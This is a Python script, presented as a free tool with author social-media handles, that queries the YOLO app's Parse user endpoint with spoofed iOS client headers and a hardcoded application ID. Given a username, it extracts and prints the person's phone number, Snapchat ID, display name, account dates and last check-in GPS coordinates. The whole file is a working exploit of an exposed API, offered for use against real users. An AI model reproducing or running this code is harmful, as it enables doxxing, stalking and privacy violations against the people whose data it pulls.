#
# This Is Free Tool By Soud Alanzi AKA @8Y
# Dont Try Sell It Cuz It's Fucking Free
# Github: https://github.com/Soud69
# Instagram: https://instagram.com/8Y
# Telegram: https://t.me/Soud69
# Discord: Soud#5866
#

try:
    import requests
    import os
    from os import system, path
    import json
    system("title " + "Soud Was Here - @8Y - Soud#5866")
    import colorama
    from colorama import Fore
    colorama.init(autoreset=True)

except Exception as m:
    print("Something Went Wrong\n")
    print(m)
    input()
    exit()
logo = f"""
{Fore.CYAN}         _______   __ {Fore.GREEN}__   __    _       
{Fore.CYAN}   ____ |  _  \ \ / / {Fore.GREEN}\ \ / /   | |      
{Fore.CYAN}  / __ \ \ V / \ V /  {Fore.GREEN} \ V /___ | | ___  
{Fore.CYAN} / / _` |/ _ \  \ /   {Fore.GREEN}  \ // _ \| |/ _ \ 
{Fore.CYAN}| | (_| | |_| | | |   {Fore.GREEN}  | | (_) | | (_) |
{Fore.CYAN} \ \__,_\_____/ \_/   {Fore.GREEN}  \_/\___/|_|\___/ 
{Fore.CYAN}  \____/                                                                                   
"""
print(logo)
print(f"{Fore.RED}This Is Free Tool By Soud Alanzi And Not For Sale\n\n{Fore.RESET}{Fore.GREEN}Instagram: @8Y + @_agf\nDiscord: Soud#5866\n")
yolo_id = input("Enter Yolo Username: ")
yolo_url = f"http://onyolo.com/parse/classes/_User/{yolo_id}"
yolo_headers = {
	"Host": "onyolo.com",
	"X-YOLO-Client-OS-Version": "14.2.1",
	"X-YOLO-Client-Type": "iOS",
	"Accept": "*/*",
	"apollographql-client-version": "8.1-526",
	"X-Parse-Application-Id": "RTE8CXsUiVWfG1XlXOyJAxfonvt",
	"Accept-Language": "en-us",
	"Accept-Encoding": "gzip, deflate, br",
	"X-YOLO-Client-Version": "8.1",
	"User-Agent": "YOLO/526 CFNetwork/1206 Darwin/20.1.0",
	"apollographql-client-name": "com.Popshow.YOLO-apollo-ios",
	"Connection": "keep-alive",
	"Content-Type": "application/json",
	"X-APOLLO-OPERATION-NAME": "MarkFriendsSuggestionsAsSeen"
	}
yolo_req = requests.get(yolo_url, headers=yolo_headers)
if "objectId" in yolo_req.text:
	print("Grabbing Yolo Info\n")
	yolo_info = json.loads(yolo_req.text)
	yolo_username = yolo_info["username"]
	yolo_snap = yolo_info["snapchatExternalId"]
	yolo_name = yolo_info["displayName"]
	yolo_avatar = yolo_info["bitmojiAvatarUrl"]
	yolo_creat = yolo_info["createdAt"]
	yolo_update = yolo_info["updatedAt"]
	yolo_phone = yolo_info["phoneNumber"]
	yolo_country = yolo_info["lastCheckin"]["countryCode"]
	yolo_location = yolo_info["lastCheckin"]["ll"]
	print("------------------------------\n")
	print(f"Username: {yolo_username}\nSnap {yolo_snap}\nFull Name: {yolo_name}\nAvatar: {yolo_avatar}\nCreated at: {yolo_creat}\nUpdated at: {yolo_update}\nPhone: {yolo_phone}\nCountry: {yolo_country}\nLocation: {yolo_location}\n")
	print("------------------------------")
	input()
	exit()
else:
	print("Yolo Account Not Found")
	input()
	exit()
